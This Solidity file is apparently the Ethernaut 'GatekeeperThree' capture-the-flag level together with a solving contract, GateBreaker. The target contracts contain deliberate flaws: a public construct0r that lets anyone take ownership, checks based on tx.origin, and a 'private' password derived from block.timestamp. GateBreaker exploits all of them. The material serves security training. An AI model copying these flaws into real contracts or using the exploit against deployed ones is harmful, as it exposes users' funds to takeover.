// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
    Nice job! For more information read this and this.
        https://medium.com/loom-network/ethereum-solidity-memory-vs-storage-how-to-initialize-an-array-inside-a-struct-184baf6aa2eb
        https://medium.com/loom-network/ethereum-solidity-memory-vs-storage-how-to-initialize-an-array-inside-a-struct-184baf6aa2eb
        
 100%: Congratulations! Your journey down the web3 rabbit hole is impressive and should be celebrated! You now have the skills to break smart contracts! What’s next from here anon? 
 Apply to be a Blockchain Security Researcher at OpenZeppelin, and contribute to securing the top protocols in web3! https://grnh.se/26c05aac3us
 */
contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allow_entrance;
  event GateBraked(uint256 number);

  SimpleTrick public trick;

  constructor() payable {
  }

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allow_entrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allow_entrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function testGateOne() public gateOne {
      emit GateBraked(1);
  }

  function testGateTwo() public gateTwo {
      emit GateBraked(2);
  }

  function testGateThree() public gateThree {
      emit GateBraked(3);
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}


/// @title contract to ender GatekeeperThree
contract GateBreaker {
    GatekeeperThree gk;
    uint public password = block.timestamp;

    constructor(address gateeeperThreeAddress) {
        gk = GatekeeperThree(payable(gateeeperThreeAddress));
        gk.construct0r();
        gk.createTrick();
        gk.getAllowance(password);
    }

    function enter() public {
        gk.enter();
    }

    function testGate(uint gateNumber) public {
        if (1 == gateNumber) {
            gk.testGateOne();
        } else if (2 == gateNumber) {
            gk.testGateTwo();
        } else if (3 == gateNumber) {
            gk.testGateThree();
        }
    }
}